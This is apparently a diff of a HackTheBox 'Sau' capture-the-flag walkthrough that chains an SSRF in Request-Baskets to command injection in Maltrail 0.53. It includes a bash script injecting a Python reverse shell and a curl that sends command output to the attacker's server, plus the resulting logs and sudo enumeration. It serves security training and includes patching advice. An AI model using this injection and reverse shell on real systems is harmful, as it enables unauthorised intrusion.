@@ -91,10 +91,32 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Filtered site at port 80, port 55555 holds an interesting site however:
 ### Request-Baskets: 55555
 Version: 1.2.1 (newest is 1.2.3)
-
+ 
 ### Request-Baskets(SSRF):55555 -> Maltrail:80
 Version: 0.53 (newest is 0.60)
 
+This site is filtered to only allow local traffic to access this port, using the SSRF vulnerability discovered these pages can be accessed through `http://sau.htb:55555/{exploit_bucket}/`
+
+## Internal Access
+
+### Maltrail(RCE) -> Initial Access
+Device OS: Linux 
+```bash
+uname -a
+Linux sau 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+```
+Running user: puma
+```bash
+whoami
+puma
+```
+Shell has spawned in `/opt/maltrail` which seems to be the webroot for the maltrail service exploited. 
+
+The usage of the `puma` user is interesing, there is a puma service that does exist online but i think this is an actual user account due to it having the id 1001 and having a home directory `/home/puma`. This is where the `user.txt` flag exists so i may as well grab it now 
+```bash
+cat /home/puma/user.txt
+072342**************6f7daae
+```
 
 
 # Research
@@ -110,15 +132,35 @@ SSRF is essentially allowing an attacker to create traffic as if it was generate
 
 Why would a SSRF vulnerability be useful here? Because of the filtered web port. There is a possibility that there is indeed a web site running there but it is only acessable via the local device. If this site has a SSRF vulnerability it could be used to gain access to this filtered site.
 
+
+
 ## Maltrail
 "Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails" - Github
 
-### RCE [Assessing]
-Traffic detection system, again unfortunately this system also has a widely known Command Injection vulnerability with PoC: https://github.com/spookier/Maltrail-v0.53-Exploit
+While the site is a bit difficult to navigate it should be reasonably easy to use a tool such as gobuster to find any directories hidden, but since the page is nice enough to give out its version number on the home page i may as well google it.
 
-This time the vulnerability may lead to a more severe RCE (Remote Code Execution) vulnerability which if successfully exploited would allow futher internal access to the underlying server and potentially even more vulnerable services.
+### RCE [Confirmed]
+Again, unfortunately this system also has a widely known Command Injection vulnerability with PoC: https://github.com/spookier/Maltrail-v0.53-Exploit
 
+This time the vulnerability may lead to a more severe RCE (Remote Code Execution) vulnerability which if successfully exploited would allow futher internal access to the underlying server and potentially even more vulnerable attack surfaces.
 
+## Initial Access
+
+Having found myself inside a linux box again is good, although i currently only have initial access with a user account, there are many different priviliage escalation bugs which have existed in many different types of Linux environments. 
+
+### Privilage Escalation [Assessing]
+
+One of the first commands to run when looking for escalation bugs is determining if the users of this server have built a method in for us by accident by allowing the user to run select administrative tasks which may be abused.
+
+```bash
+puma@sau:/dev/shm$ sudo -l
+sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service``` 
 
 # Assess
 ## Requests-Baskets
@@ -211,19 +253,52 @@ Creating vulnerable basket...
 ```
 
 And what do we get when we visit that page?
-![Maltrail via SSRF]()
+![Maltrail via SSRF](https://github.com/e-war/Writeups/blob/master/HackTheBox/Sau/Images/1.png?raw=true)
 
+Well the css and js haven't loaded at all due to how i'm accessing this page but that is for sure a new website. The bottom left tells us this is a program called "Maltrail", well i think it's time to [review](#review) and then investigate this further.
 ## Maltrail
 Code appended onto previous exploit code.
 
 I seperated out the shellcode from the rest as a lot of the time one liner shellcode sometimes will seem to work with most people's experience but not mine so i tend to bounce around oneliners until one works reliably. Hence the seperation for easy swapout of shellcode.
 ```bash
-shellcode=""
-curl "$vulnerable/$basket" --data "username=;$shellcode"
+echo "Hope you have nc open.. SHELL INCOMING!";
+attackerIP="10.10.x.x";
+attackerPort=4444;
+shellcode='curl "http://'"$attackerIP"':8000/?d=$(/usr/bin/python3+-c+'\''a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("'"$attackerIP"'",'"$attackerPort"'));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/bash")'\'')"'
+echo 'username=;`'"$shellcode"'`'
+curl "$vulnerable/$basket/login" --data 'username=;`'"$shellcode"'`#'
 ```
+
+Although they shouldn't really be necessary the ``` ` ``` backtics indicate to the linux command line that the shellcode is to be run, the `#` hash symbol indicates that anything following the injected command should be ignored as a comment.
+
+Working with bactic and different string characters in strings is easier to do with literal strings using `'` single quotes. Variables cannot go in literal strings which is why there are a lot of string characters. 
+
+I Setup a simple HTTP server and chose to wrap my injected commands into a curl to my own http server, this allowed me to run commands and view the stdout of the command, e.g.:
+```
+10.10.11.224 - - [12/Aug/2023 08:44:21] "GET /?d=puma HTTP/1.1" 200 -
+10.10.11.224 - - [12/Aug/2023 08:45:26] "GET /?d= HTTP/1.1" 200 -
+10.10.11.224 - - [12/Aug/2023 08:46:03] "GET /?d=Linux HTTP/1.1" 200 -
+10.10.11.224 - - [12/Aug/2023 08:47:19] "GET /?d= HTTP/1.1" 200 -
+10.10.11.224 - - [12/Aug/2023 08:47:38] "GET /?d= HTTP/1.1" 200 -
+10.10.11.224 - - [12/Aug/2023 08:47:51] "GET /?d= HTTP/1.1" 200 -
+10.10.11.224 - - [12/Aug/2023 08:48:03] "GET /?d=/usr/bin/cat HTTP/1.1" 200 -
+10.10.11.224 - - [12/Aug/2023 08:48:16] "GET /?d=/usr/bin/nc HTTP/1.1" 200 -
+```
+
+And when running the script with a `nc` (netcat) listener i see:
+![Internal Access](https://github.com/e-war/Writeups/blob/master/HackTheBox/Sau/Images/2.png?raw=true)
 
 # Review
 ## Request-Baskets
-An extremely easy to exploit attack surface of Requests-Buckets allowed further exploitation of the system by granting access to "internal" services local to the vulnerable device.
+The public facing attack surface of Requests-Buckets allowed further exploitation of the system by granting access to "internal" services local to the vulnerable device due to the running version being out of date. 
 
-Updating to the newest version is recommended to prevent futher exploitation.
+Updating to the newest version is recommended to prevent futher exploitation as proof of concepts are easy to find online anyone could exploit this site using them.
+
+As shown, utilising this vulnerability allows accessing the filtered port 80, this walkthrough now returns to [Investigation](#request-basketsssrf55555---maltrail80)
+
+## Maltrail
+Although this service is hidden behind an IP filter it is still accessable due to previous vulnerabilities. Unfortuantely this service also holds a RCE (Remote code execution) vulnerability which allows unauthorised code to run on the victim server.
+
+Again this service is out of date and PoC are easily found, therefore upgrading this version to the newest version will also close this vulnerability.
+
+Now internal access to the machine has been aquired, futher [Investigation](#investigate) is required to see if the machine is vulnerable to internal attacks.
